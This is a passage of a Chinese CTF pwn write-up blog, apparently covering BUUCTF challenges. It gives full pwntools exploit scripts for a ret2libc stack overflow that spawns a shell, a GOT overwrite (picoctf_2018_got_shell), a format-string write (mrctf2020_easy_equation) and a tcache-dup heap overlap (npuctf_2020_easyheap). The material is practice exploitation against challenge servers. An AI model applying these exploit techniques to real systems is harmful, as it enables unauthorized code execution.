punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./\"</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29470</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b gets'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">#write_p = e.plt['write']</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>offset<span class=\"token operator\">=</span><span class=\"token number\">0x06c</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#choose use puts or write</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>puts_p<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">#payload = b'a'*offset + p32(write_p) + p32(main_a) + p32(1) + p32(lsm_g) +p32(4)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input:\\n'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\">#choose use LibcSearcher or libc file</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">#'''</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>libcbase = lsm_a - libc.sym['__libc_start_main']</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>sys_a = libcbase + libc.sym['system']</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>bs_a = libcbase + next(libc.search(b'/bin/sh'))</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>bs_a<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"53\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"picoctf_2018_got_shell\"><a class=\"markdownIt-Anchor\" href=\"#picoctf_2018_got_shell\">#</a> picoctf_2018_got_shell</h2>\n<p>修改 got</p>\n<p>拥有一次任意读写的机会。主函数最后使用 exit 退出。还有后门函数。got 表可写。</p>\n<p>很明显了，修改 exit 的 got 表为后门函数的地址。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./PicoCTF_2018_got-shell')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27411</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>gadget <span class=\"token operator\">=</span> <span class=\"token number\">0x0804854B</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>exit_g <span class=\"token operator\">=</span> <span class=\"token number\">0x0804A014</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>exit_g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>gadget<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20231110150108645.png\" alt=\"image-20231110150108645\"></p>\n<h2 id=\"mrctf2020_easy_equation\"><a class=\"markdownIt-Anchor\" href=\"#mrctf2020_easy_equation\">#</a> mrctf2020_easy_equation</h2>\n<p>fmtstr</p>\n<p>数学题</p>\n<p>17 ^ x4 - 13x^3 + 11x^2 - 7x =198<img data-src=\"./image-20231110151048985.png\" alt=\"image-20231110151048985\"></p>\n<p>解得 x=2</p>\n<p>利用 printf 格式化漏洞将 judge 的值修改为 2。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./mrctf2020_easy_equation')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28696</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b printf')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x60105C</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span>target<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"npuctf_2020_easyheap\"><a class=\"markdownIt-Anchor\" href=\"#npuctf_2020_easyheap\">#</a> npuctf_2020_easyheap</h2>\n<p>tcache dup, off_by_one, overlap</p>\n<p>该题目运行于 ubunut 18.04，经查找，libc 版本为 2.27，此版本在 2.26 之后，已经开始使用 tcache。但 tcache 相关机制还未完善，tcache dup 的实现十分便捷。</p>\n<p>释放堆块后数组清空地址。且只能分配真实大小 0x20 和 0x40 的用户块，管理块固定为 0x20.</p>\n<p>首先调整堆块排列，构造出两个 0x20 的用户块 a 和 b 相邻的情况。其中地址高的那块往下与 0x20 的 c 块相连。利用 off_by_one 将 b 块的 size 设为 0x41。形成堆块重叠。</p>\n<p>由此，b 块可以控制 c 块内容。将 c 块释放后，用 b 块往 c 块写入 free 的 got 地址。因为两者都为 0x20 大小，所以下一次分配可以得到管理块为 c 块，用户块为 got 表 free 的块。由此可对其进行读写。</p>\n<p>为了泄露 free 的地址用于计算 system 的地址，一开始不能修改到 free_got 的数据。但分配函数分配完便要求一次输入。因此选择分配到 free_got 低一位的地址，在分配时输入任意非空字符。之后覆盖 free 地址时也记得补上 1 偏移。（另一种解决方法是泄露 got 表中下一项_exit 的值）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'npuctf_2020_easyheap'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28329</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *0x400E75'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Your choice :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Size of Heap(0x10 or 0x20 only) : '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content:'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content: '</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content :'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#4</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#1 low</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0 high</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#6</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>free_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>free_g<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>free_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+] free addr: %#x'</span><span class=\"token operator\">%</span>free_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">,</span> free_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>libcbase <span class=\"token operator\">=</span> free_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token 